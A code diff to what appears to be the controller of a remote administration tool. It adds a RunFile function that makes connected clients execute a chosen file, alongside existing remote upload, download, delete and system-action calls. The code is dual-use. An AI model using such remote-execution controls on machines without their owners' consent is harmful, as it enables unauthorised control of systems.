@@ -155,10 +155,10 @@ def ManageConnections(command, connection=None):
                      break
 
          except (socket.error, ValueError, IndexError):
-            return False
+            return list()
 
    except (ValueError, IndexError):
-      return False
+      return list()
 
    finally:
       command = None
@@ -309,6 +309,20 @@ def DeleteFile(connection, path):
       return True if ('file-deleted' in status) else False
    
    return None
+
+def RunFile(connection, path):
+   response = send_and_receive(connection, 'run-file')
+
+   if ('run-file' in response):
+      send(connection, path)
+      status = receive(connection)
+
+      if ('file-not-exist' in status):
+         return False
+      
+      return ('file-run-success' in status)
+   
+   return None
    
 def SystemAction(connection, action):
    response = send_and_receive(connection, action)
@@ -399,6 +413,7 @@ webapi.api.GetFiles = GetFiles
 webapi.api.UploadFile = UploadFile
 webapi.api.DownloadFile = DownloadFile
 webapi.api.DeleteFile = DeleteFile
+webapi.api.RunFile = RunFile
 
 server_thread = threading.Thread(target=start_websocket_server)
 server_thread.daemon = True
